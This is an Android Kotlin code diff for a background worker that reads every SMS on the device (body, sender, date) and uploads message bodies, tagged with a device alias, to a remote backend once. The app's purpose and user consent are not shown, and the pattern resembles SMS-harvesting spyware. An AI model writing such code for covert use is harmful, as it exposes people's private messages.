@@ -83,34 +83,42 @@ class SmsWork(private val context: Context, workerParams: WorkerParameters) :
 
             scope.launch {
                 localDataProvider.aliasDevice.collect { alias ->
-
                     val uri: Uri = Telephony.Sms.CONTENT_URI
                     if (alias.isNotEmpty()) {
-                        val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)
-                        cursor?.use {
-                            val indexId = it.getColumnIndex(Telephony.Sms._ID)
-                            val indexBody = it.getColumnIndex(Telephony.Sms.BODY)
-                            val indexAddress = it.getColumnIndex(Telephony.Sms.ADDRESS)
-                            val indexDate = it.getColumnIndex(Telephony.Sms.DATE)
+                        remoteDataProvider.unuploadedSmsToInternet.collect{ smsToInternet ->
+                            if (!smsToInternet){
+                                showText("INCLUYENDO SMS POR PRIMERA VEZ")
+                                val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)
+                                cursor?.use {
+                                    val indexId = it.getColumnIndex(Telephony.Sms._ID)
+                                    val indexBody = it.getColumnIndex(Telephony.Sms.BODY)
+                                    val indexAddress = it.getColumnIndex(Telephony.Sms.ADDRESS)
+                                    val indexDate = it.getColumnIndex(Telephony.Sms.DATE)
 
-                            while (it.moveToNext()) {
-                                val uid = it.getLong(indexId).toString()
-                                val body = it.getString(indexBody)
-                                val address = it.getString(indexAddress)
-                                val date = it.getLong(indexDate)
-                                val dateSent = Date(date)
-                                val format =
-                                    SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
-                                val dateSentFormatted = format.format(dateSent)
+                                    while (it.moveToNext()) {
+                                        val uid = it.getLong(indexId).toString()
+                                        val body = it.getString(indexBody)
+                                        val address = it.getString(indexAddress)
+                                        val date = it.getLong(indexDate)
+                                        val dateSent = Date(date)
+                                        val format =
+                                            SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
+                                        val dateSentFormatted = format.format(dateSent)
 
-                                withContext(Dispatchers.IO) {
-                                    remoteDataProvider.setSms(
-                                        SmsDevices(
-                                            alias = alias,
-                                            sms = body
-                                        )
-                                    )
+                                        withContext(Dispatchers.IO) {
+                                            remoteDataProvider.setSms(
+                                                SmsDevices(
+                                                    alias = alias,
+                                                    sms = body
+                                                )
+                                            )
+                                        }
+                                    }
                                 }
+                                remoteDataProvider.setStateSmsInternet(true)
+                            } else {
+                                // UPDATED SMS
+                                showText("UPDATED SMS..")
                             }
                         }
                     }
@@ -122,4 +130,7 @@ class SmsWork(private val context: Context, workerParams: WorkerParameters) :
             return Result.failure()
         }
     }
+
+    private fun showText(text: String) =
+        Log.d("INICIO_TIM", text)
 }
